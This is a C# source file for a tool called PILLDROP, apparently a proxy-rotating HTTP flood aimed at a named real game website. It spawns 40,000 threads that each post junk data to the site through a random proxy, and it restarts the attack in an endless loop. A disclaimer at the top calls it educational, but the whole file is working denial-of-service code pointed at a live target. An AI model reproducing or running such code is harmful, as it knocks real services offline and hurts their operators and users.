using System;
using System.Net;
using System.Threading;

namespace PILLDROP
{
    /**
     * Note: This is only made for educational use.
     * Use it at your own risk, I take no responsibility for the damages that may occur from this code.
     */
    internal struct Program
    {
        #region Variables
        /// <summary>
        /// The URL to Alicia Online.
        /// </summary>
        private const string url = "https://aliciagame.com/";

        /// <summary>
        /// The data string to be uploaded.
        /// </summary>
        private const string data = "aåöäöÅ";

        /// <summary>
        /// The amount of threads to be created for the attack.
        /// </summary>
        private const ushort threads = 40000;

        /// <summary>
        /// The amount of sent requests.
        /// </summary>
        private static long sent;
        #endregion

        /// <summary>
        /// Main startup function.
        /// </summary>
        private static void Main()
        {
            Console.Title = "PILLDROP";
            while (true)
            {
                sent = 0;
                Console.WriteLine("[i] Grabbing proxies...");
                ProxyProcessor.grab_proxies();
                Console.WriteLine($"[i] {ProxyProcessor.proxies.Count} proxies stored, starting attack!");
                begin_attack();
                Console.WriteLine("[i] Attack finished, cleaning and restarting");
                GC.Collect();
            }
        }

        /// <summary>
        /// Update the title.
        /// </summary>
        private static void update_title() => Console.Title = $"PILLDROP - Sent {sent} request(s)";

        /// <summary>
        /// Start the attack.
        /// </summary>
        private static void begin_attack()
        {
            for (ushort i = 0; i < threads; i++)
            {
                new Thread(() =>
                {
                    try
                    {
                        var proxy = ProxyProcessor.get_random_proxy();
                        using var client = new WebClient {Proxy = new WebProxy(proxy.ip, proxy.port)};
                        client.UploadString(url, data);
                        client.Dispose();
                        sent++;
                        update_title();
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                }).Start();
            }
        }
    }
}
